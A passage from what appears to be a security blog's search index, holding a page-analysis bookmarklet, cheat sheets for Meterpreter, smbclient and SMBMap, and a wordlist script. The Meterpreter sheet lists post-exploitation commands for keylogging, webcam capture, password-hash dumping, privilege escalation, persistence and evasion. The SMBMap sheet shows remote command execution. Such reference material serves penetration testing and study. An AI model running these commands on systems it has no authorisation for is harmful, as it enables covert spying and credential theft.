instantly.\nWhy Build This? Sometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\nWhat Does It Do? Once activated, the bookmarklet scans the current webpage and extracts:\nForms: Shows details like form actions, methods, and input elements.\nLinks: Lists all hyperlinks found on the page.\nImages: Displays all images in an easy-to-view layout.\nWord Count: Calculates the total number of words in the page’s text content.\nThe results are neatly presented in a new browser window with clean formatting, so you can analyze everything at a glance.\nInstallation Setting it up is simple. Here’s how:\nOpen your web browser and create a new bookmark.\nEdit the bookmark’s URL field and paste the following JavaScript code:\njavascript:(function(){var forms=document.getElementsByTagName(\u0026#39;form\u0026#39;);var links=document.getElementsByTagName(\u0026#39;a\u0026#39;);var images=document.getElementsByTagName(\u0026#39;img\u0026#39;);var bodyText=document.body.innerText;var wordCount=bodyText.split(/\\s+/).filter(function(word){return word.length\u0026gt;0;}).length;var newWindow=window.open(\u0026#39;\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;width=800,height=600\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;Extracted Data\u0026lt;/title\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;style\u0026gt;body{font-family:Arial,sans-serif}table{width:100%;border-collapse:collapse;margin-bottom:20px}th,td{border:1px solid #ddd;padding:8px;text-align:left}th{background-color:#f2f2f2}tr:nth-child(even){background-color:#f9f9f9}h2{background-color:#4CAF50;color:white;padding:10px}\u0026lt;/style\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Forms:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;forms.length;i++){var form=forms[i];newWindow.document.write(\u0026#39;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th colspan=\u0026#34;3\u0026#34;\u0026gt;Form \u0026#39;+(i+1)+\u0026#39;\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Action\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.action||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;Method\u0026lt;/td\u0026gt;\u0026lt;td colspan=\u0026#34;2\u0026#34;\u0026gt;\u0026#39;+(form.method||\u0026#39;get\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Name\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Type\u0026lt;/th\u0026gt;\u0026lt;th\u0026gt;Value\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var j=0;j\u0026lt;form.elements.length;j++){var element=form.elements[j];var value=element.value||\u0026#39;N/A\u0026#39;;if(element.type===\u0026#39;checkbox\u0026#39;||element.type===\u0026#39;radio\u0026#39;){value=element.checked?\u0026#39;on\u0026#39;:\u0026#39;off\u0026#39;}newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.name||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+(element.type||\u0026#39;N/A\u0026#39;)+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;td\u0026gt;\u0026#39;+value+\u0026#39;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Links:\u0026lt;/h2\u0026gt;\u0026lt;table\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;th\u0026gt;Link\u0026lt;/th\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;links.length;i++){newWindow.document.write(\u0026#39;\u0026lt;tr\u0026gt;\u0026lt;td\u0026gt;\u0026lt;a href=\u0026#34;\u0026#39;+links[i].href+\u0026#39;\u0026#34; target=\u0026#34;_blank\u0026#34;\u0026gt;\u0026#39;+links[i].href+\u0026#39;\u0026lt;/a\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;/table\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Images:\u0026lt;/h2\u0026gt;\u0026#39;);for(var i=0;i\u0026lt;images.length;i++){newWindow.document.write(\u0026#39;\u0026lt;img src=\u0026#34;\u0026#39;+images[i].src+\u0026#39;\u0026#34; style=\u0026#34;max-width:100%;display:block;margin-bottom:10px;\u0026#34;\u0026gt;\u0026#39;)}newWindow.document.write(\u0026#39;\u0026lt;h2\u0026gt;Word Count:\u0026lt;/h2\u0026gt;\u0026lt;p\u0026gt;\u0026#39;+wordCount+\u0026#39; words\u0026lt;/p\u0026gt;\u0026#39;);newWindow.document.write(\u0026#39;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#39;);newWindow.document.close();})(); Save the bookmark.\nThat’s it! You now have a bookmarklet ready to extract webpage info.\nHow to Use Navigate to the webpage you want to analyze.\nClick on the saved bookmarklet.\nA new window will pop up with the following details:\nForms: Lists actions, methods, and input fields.\nLinks: Displays all hyperlinks found on the page.\nImages: Previews all images on the page.\nWord Count: Shows the total word count of the page’s text content.\nWhy Use It? This tool is perfect for:\nWeb Developers: Debugging forms, analyzing links, or reviewing images for optimization.\nContent Creators: Counting words or inspecting embedded media.\nResearchers: Extracting links or analyzing page structures quickly.\nIt’s not trying to replace full-fledged tools like browser dev tools, but it’s great for quick insights without digging into a complex interface.\nLimitations This bookmarklet is lightweight and portable, but it’s not flawless. Here are a few things to keep in mind:\nBrowser Compatibility: It works on most modern browsers but may struggle with certain page structures or dynamic content.\nStatic Analysis: It doesn’t execute JavaScript-heavy elements, so it’s best suited for simpler pages.\nBasic Formatting: The output is clean but not customizable.\nFinal Thoughts The Webpage Infos Extractor isn’t revolutionary, but it’s incredibly handy. Whether you’re troubleshooting a webpage or casually analyzing content, this bookmarklet gives you the essentials at a click. Simple, portable, and effective (sometimes), that’s all you need. If you think of ways to enhance it, feel free to tweak the code and make it your own!\n","permalink":"http://localhost:1313/tools/webpage_infos_extractor/","summary":"\u003cp\u003eWhen you need to quickly understand the structure of a webpage, a lightweight tool can save the day. \u003cstrong\u003eWebpage Infos Extractor\u003c/strong\u003e is just that: a simple JavaScript bookmarklet that extracts useful information like forms, links, images, and word count from any webpage. No extensions or extra software required—just a single bookmark to get key insights instantly.\u003c/p\u003e\n\u003ch2 id=\"why-build-this\"\u003eWhy Build This?\u003c/h2\u003e\n\u003cp\u003eSometimes, the simplest tools are the most convenient. I needed a way to peek under the hood of webpages during quick tests or casual research without opening dev tools every time. So, I threw together this bookmarklet to make data analysis fast and portable. It’s not groundbreaking, but it gets the job done without any fuss.\u003c/p\u003e","title":"Webpage Infos Extractor"},{"content":"Basic Commands Start with the essentials to get a lay of the land:\nhelp: Display a list of available commands (your lifeline when you\u0026rsquo;re lost). sysinfo: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;). ps: List running processes. kill \u0026lt;PID\u0026gt;: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;). migrate \u0026lt;PID\u0026gt;: Move Meterpreter to a different process to stay under the radar. rev2self: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird). File System Commands For poking around the file system:\nls: List files in the current directory. cd \u0026lt;path\u0026gt;: Change to a new directory. pwd: Print the current working directory. cat \u0026lt;filename\u0026gt;: Display the contents of a file. download \u0026lt;filename\u0026gt;: Pull a file from the target to your local machine. upload \u0026lt;filename\u0026gt;: Push a file to the target system. Network Commands To scope out the network situation:\nipconfig: Display network configuration (IP addresses, gateways, etc.). route: Show the routing table. netstat: View active network connections. portfwd [add/remove]: Set up port forwarding (e.g., local port -\u0026gt; remote service). getsockname: Identify the socket name for a connection. User Management Commands Understand who you are and who else is around:\ngetuid: Display the current user ID. ps: See running processes and their owners. getprivs: List the privileges available to the current user. getsystem: Attempt to escalate privileges to SYSTEM (good luck!). Persistence Commands Stick around longer than you’re welcome:\npersistence: Enable Meterpreter persistence on the target (requires autorun setup). run \u0026lt;script\u0026gt;: Execute scripts or commands at startup. Shell Commands Take a deeper dive with shell access:\nshell: Open a command prompt on the target (sometimes, old-school is best). execute -f \u0026lt;command\u0026gt;: Run a command on the target. background: Push your current session into the background to multitask. Ctrl+Z: Suspend the current session (don’t forget to resume it later). Other Commands For the extra \u0026ldquo;James Bond\u0026rdquo; touch:\nuse \u0026lt;extension\u0026gt;: Load a Meterpreter extension (e.g., incognito, sniffer). keyscan_start: Begin logging keystrokes (capture your target’s every typo). keyscan_dump: Dump the logged keystrokes. screenshot: Capture a screenshot of the target’s desktop. webcam_list: See available webcams on the target. webcam_snap: Take a snapshot from a webcam. hashdump: Dump password hashes (everyone’s favorite). timestomp \u0026lt;file\u0026gt;: Modify the timestamps of a file (because subtlety matters). Tips and Tricks Migrate Smartly: When migrating, pick a process that’s stable (e.g., explorer.exe) and won’t raise suspicions. Background Often: Always background your session before launching new exploits—multitasking is key. Scripting is King: Use Meterpreter scripts (run \u0026lt;script\u0026gt;) to automate repetitive tasks. ","permalink":"http://localhost:1313/cheat-sheets/meterpreter/","summary":"\u003ch2 id=\"basic-commands\"\u003eBasic Commands\u003c/h2\u003e\n\u003cp\u003eStart with the essentials to get a lay of the land:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ehelp\u003c/code\u003e\u003c/strong\u003e: Display a list of available commands (your lifeline when you\u0026rsquo;re lost).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003esysinfo\u003c/code\u003e\u003c/strong\u003e: Get basic system information, including OS and hostname (think of it as a \u0026ldquo;who am I dealing with?\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eps\u003c/code\u003e\u003c/strong\u003e: List running processes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ekill \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Terminate a process by its PID (because some processes just need to \u0026ldquo;go away\u0026rdquo;).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003emigrate \u0026lt;PID\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Move Meterpreter to a different process to stay under the radar.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003erev2self\u003c/code\u003e\u003c/strong\u003e: Revert privileges to the original user (a \u0026ldquo;reset button\u0026rdquo; for when things get weird).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"file-system-commands\"\u003eFile System Commands\u003c/h2\u003e\n\u003cp\u003eFor poking around the file system:\u003c/p\u003e","title":"Meterpreter"},{"content":"smbclient is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\nBasic Usage To connect to an SMB file share, use the following syntax:\nsmbclient //server/share [options] Replace server with the hostname or IP address of the server hosting the file share. Replace share with the name of the file share. Once connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\nCommon Options -U \u0026lt;username\u0026gt;: Specify the username to use for authentication. -W \u0026lt;workgroup\u0026gt;: Specify the domain or workgroup. -I \u0026lt;IP address\u0026gt;: Directly specify the server\u0026rsquo;s IP address. -p \u0026lt;port\u0026gt;: Specify the port (default is 445). -d \u0026lt;debug level\u0026gt;: Set the debug level for verbose output. -N: Suppress the password prompt (useful for guest accounts). Available Commands Once connected, the following commands allow you to interact with the file share:\nls: List files and directories in the current directory. cd \u0026lt;directory\u0026gt;: Change to a different directory. pwd: Print the current working directory. put \u0026lt;file\u0026gt;: Upload a file to the share. get \u0026lt;file\u0026gt;: Download a file from the share. mput \u0026lt;files\u0026gt;: Upload multiple files. mget \u0026lt;files\u0026gt;: Download multiple files. rm \u0026lt;file\u0026gt;: Delete a file. mkdir \u0026lt;directory\u0026gt;: Create a new directory. rmdir \u0026lt;directory\u0026gt;: Remove a directory. exit: Disconnect from the share and exit smbclient. Examples List Files in a Share smbclient //server/share -c ls Connect with a Specific Username and Password smbclient //server/share -U username%password Connect Using an IP Address and Port smbclient //server/share -I 192.168.1.100 -p 139 Upload a File smbclient //server/share -c \u0026#34;put /path/to/local/file\u0026#34; Download a File smbclient //server/share -c \u0026#34;get /path/to/remote/file\u0026#34; Create a New Directory smbclient //server/share -c \u0026#34;mkdir newdirectory\u0026#34; When to Use smbclient Quick Access: Need to interact with a file share without mounting it? smbclient gives you immediate access. Testing Permissions: Check which directories and files are accessible under different credentials. File Operations: Download, upload, or manage files on SMB shares. Debugging: Troubleshoot network shares with verbose output using -d. ","permalink":"http://localhost:1313/cheat-sheets/smbclient/","summary":"\u003cp\u003e\u003cstrong\u003esmbclient\u003c/strong\u003e is a command-line tool that allows you to interact with SMB (Server Message Block) file shares. Whether you’re uploading files, listing directories, or troubleshooting network shares, this tool is your go-to for SMB.\u003c/p\u003e\n\u003ch2 id=\"basic-usage\"\u003eBasic Usage\u003c/h2\u003e\n\u003cp\u003eTo connect to an SMB file share, use the following syntax:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbclient //server/share \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eserver\u003c/code\u003e\u003c/strong\u003e with the hostname or IP address of the server hosting the file share.\u003c/li\u003e\n\u003cli\u003eReplace \u003cstrong\u003e\u003ccode\u003eshare\u003c/code\u003e\u003c/strong\u003e with the name of the file share.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOnce connected, you will be prompted for credentials. After successful authentication, a command prompt will allow you to interact with the share.\u003c/p\u003e","title":"smbclient"},{"content":"Basic Syntax smbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; [options] Common Usage Examples Connect with Null Password smbmap -u guest -p \u0026#34;\u0026#34; -d . -H 192.168.1.1 Connect as Admin with Password smbmap -u admin -p password123 -d . -H 192.168.1.1 Execute a Command smbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u0026#39;ipconfig\u0026#39; Connect to a Specific Drive smbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u0026#39;C$\u0026#39; Upload a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u0026#39;/path/to/file.txt\u0026#39; \u0026#39;C$\\file.txt\u0026#39; Download a File smbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u0026#39;C$\\file.txt\u0026#39; Enumerate a Specific Share smbmap -H 192.168.1.1 -s \u0026#39;share_name\u0026#39; Enumerate Users smbmap -H 192.168.1.1 --users Key Options -u \u0026lt;username\u0026gt;: Specify the username. -p \u0026lt;password\u0026gt;: Specify the password. -H \u0026lt;host\u0026gt;: Specify the target host. -r \u0026lt;share\u0026gt;: Connect to a specific share or drive. -x \u0026lt;command\u0026gt;: Execute a command on the target. --upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;: Upload a file to the target. --download \u0026lt;remote_file\u0026gt;: Download a file from the target. -s \u0026lt;share\u0026gt;: Enumerate a specific share. --users: Enumerate users on the target. -R: Check for shares with full permissions. -p \u0026lt;port\u0026gt;: Specify a port. When to Use SMBMap Permission Audits: Quickly identify shares with read, write, or full access permissions. Command Execution: Execute remote commands on accessible shares. File Transfers: Upload or download files directly from SMB shares. User Enumeration: Discover user accounts configured on the target system. ","permalink":"http://localhost:1313/cheat-sheets/smbmap/","summary":"\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-usage-examples\"\u003eCommon Usage Examples\u003c/h2\u003e\n\u003ch3 id=\"connect-with-null-password\"\u003eConnect with Null Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u guest -p \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-as-admin-with-password\"\u003eConnect as Admin with Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"execute-a-command\"\u003eExecute a Command\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ipconfig\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-to-a-specific-drive\"\u003eConnect to a Specific Drive\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"upload-a-file\"\u003eUpload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/path/to/file.txt\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"download-a-file\"\u003eDownload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-a-specific-share\"\u003eEnumerate a Specific Share\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 -s \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;share_name\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-users\"\u003eEnumerate Users\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 --users\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"key-options\"\u003eKey Options\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the username.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-H \u0026lt;host\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target host.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Connect to a specific share or drive.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-x \u0026lt;command\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Execute a command on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Upload a file to the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--download \u0026lt;remote_file\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Download a file from the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Enumerate a specific share.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--users\u003c/code\u003e\u003c/strong\u003e: Enumerate users on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Check for shares with full permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;port\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a port.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"when-to-use-smbmap\"\u003eWhen to Use SMBMap\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePermission Audits\u003c/strong\u003e: Quickly identify shares with read, write, or full access permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommand Execution\u003c/strong\u003e: Execute remote commands on accessible shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFile Transfers\u003c/strong\u003e: Upload or download files directly from SMB shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUser Enumeration\u003c/strong\u003e: Discover user accounts configured on the target system.\u003c/li\u003e\n\u003c/ul\u003e","title":"SMBMap"},{"content":"Sometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this Wordlist Generator comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\nWhy Bash? You might be asking, why Bash? Well, there’s beauty in simplicity. This script was created to strip down the task to its essentials: no dependencies, no extra fuss, just the native power of Bash. While there are plenty of tools out there for generating wordlists, this one leans into the Unix philosophy—do one thing, and do it well.\nHow It Works The script takes one or more text files as input, extracts the words, normalizes them to lowercase, removes duplicates, sorts them, and outputs everything into a file called wordlist.txt. The end result? A clean, ordered list of unique words ready for your next project.\nKey Features Simple Input: Accepts multiple text files as input. Automatic Sorting: Ensures the wordlist is alphabetically ordered. No Dependencies: Works out of the box with any modern Bash shell. Efficiency: Processes files with a single command pipeline. Getting Started Installation Just grab the script at the bottom of this page, make it executable, and you’re good to go. Or you can get it on my github :\ngit clone https://github.com/noobosaurus-r3x/Wordlister cd Wordlister chmod +x wordlister.sh Usage The script is designed to be intuitive and easy to use. Here’s the basic syntax:\n./wordlister.sh file1.txt file2.txt file3.txt What It Does Combines the contents of all provided text files. Extracts words by splitting on non-alphanumeric characters. Converts all words to lowercase to avoid duplicates like Word and word. Removes duplicates entirely. Outputs the results into wordlist.txt in the current directory. Example Imagine you have two text files, file1.txt and file2.txt, and you want to generate a wordlist:\nRun the script:\n./wordlister.sh file1.txt file2.txt The script processes the files and outputs:\nCreated wordlist with 500 words Open wordlist.txt to see your results.\nNotes If no files are provided, the script will display a usage message and exit. The output file is overwritten each time the script runs, so be sure to back up your previous wordlists if needed. The Script For those who want a peek under the hood, here’s the full script:\n#!/usr/bin/env bash set -euo pipefail IFS=$\u0026#39;\\n\\t\u0026#39; if [ $# -eq 0 ]; then echo \u0026#34;Usage: $0 \u0026lt;text_file1\u0026gt; [\u0026lt;text_file2\u0026gt; ...]\u0026#34; exit 1 fi wordlist=\u0026#34;wordlist.txt\u0026#34; # Process input files to extract unique words in lowercase LC_ALL=C cat \u0026#34;$@\u0026#34; \\ | tr -c \u0026#39;[:alnum:]\u0026#39; \u0026#39;\\n\u0026#39; \\ | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; \\ | sort -u \u0026gt; \u0026#34;$wordlist\u0026#34; word_count=$(wc -l \u0026lt; \u0026#34;$wordlist\u0026#34;) echo \u0026#34;Created wordlist with $word_count words\u0026#34; Why Use This Script? If you need a no-nonsense way to generate a wordlist, this script has you covered. It’s lightweight, fast, and doesn’t require any external tools or libraries. Whether you’re working in cybersecurity, natural language processing, or simply organizing your text data, this Bash script is a reliable companion.\nFinal Thoughts Sometimes the simplest tools are the most effective. This wordlist generator isn’t trying to be fancy; it’s just trying to do the job—and it does it well. If you’ve got improvements or ideas, feel free to tweak the script to fit your needs. After all, the best tools are the ones you make your own.\n","permalink":"http://localhost:1313/tools/wordlister/","summary":"\u003cp\u003eSometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this \u003cstrong\u003eWordlist Generator\u003c/strong\u003e comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\u003c/p\u003e","title":"Wordlister"}]